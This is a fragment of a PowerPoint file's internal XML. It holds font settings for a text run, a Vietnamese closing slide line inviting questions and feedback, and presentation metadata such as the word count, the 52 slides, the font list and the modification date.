                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nhóm xin phép trả lời các câu hỏi và đóng góp ý kiến.</a:t>
            </a:r>
            <a:endParaRPr>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TotalTime>
  <Words>6099</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>473</Paragraphs>
  <Slides>52</Slides>
  <Notes>52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Times New Roman</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Urbanist</vt:lpstr>
      <vt:lpstr>Calibri</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Mon Mon</cp:lastModifiedBy>
  <cp:revision>12</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-05T07:46:23Z</dcterms:modified>
</cp:coreProperties>
</file>